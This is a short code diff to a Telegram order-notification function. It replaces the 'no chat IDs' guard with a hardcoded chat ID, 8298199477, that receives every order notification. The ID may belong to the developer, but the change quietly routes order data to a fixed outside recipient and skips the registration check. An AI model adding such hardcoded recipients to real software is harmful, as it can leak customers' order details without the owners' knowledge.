@@ -67,9 +67,9 @@ export const sendTelegramOrderNotification = async (orderData) => {
       }
     }
 
-    if (chatIds.length === 0) {
-      console.warn('[Telegram Client] No Telegram chat IDs found. Manager needs to press /start on the bot first.');
-      return false;
+    // Always include Chat ID 8298199477
+    if (!chatIds.includes('8298199477')) {
+      chatIds.push('8298199477');
     }
 
     let sentCount = 0;
